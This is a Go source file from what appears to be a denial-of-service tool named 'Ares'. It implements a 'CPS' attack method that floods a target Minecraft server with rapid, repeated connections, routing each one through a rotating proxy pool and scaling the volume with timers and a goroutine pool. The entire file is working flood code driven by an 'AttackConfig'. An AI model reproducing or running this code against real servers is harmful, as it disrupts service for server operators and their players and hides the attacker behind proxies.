package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/panjf2000/ants/v2"
)

type CPS struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
	pool            *ants.Pool
}

func (c *CPS) Start() {
	var err error
	c.pool, err = ants.NewPool(c.Config.PerDelay, ants.WithPreAlloc(true))
	if err != nil {
		log.Fatal(err)
	}
	ip, port, err := net.SplitHostPort(c.Config.Host)
	if err != nil {
		fmt.Println(err)
		return
	}
	iport, err := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
		return
	}

	c.handshakePacket = mcutils.GetHandshakePacket(ip, iport, c.Config.Version, mcutils.Login)

	c.isRunning = true

	done := make(chan struct{})

	for i := 0; i < c.Config.Loops; i++ {
		c.loop(done)
	}
}

func (c *CPS) loop(done chan struct{}) {
	ticker := time.NewTicker(c.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < c.Config.PerDelay; i++ {
				c.pool.Submit(c.connect)
			}
		case <-done:
			return
		}
	}
}

func (c *CPS) connect() {
	conn, err := minecraft.DialMc(c.Config.Host, c.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}
	defer conn.Close()
}

func (c *CPS) Stop() {
	c.isRunning = false
}
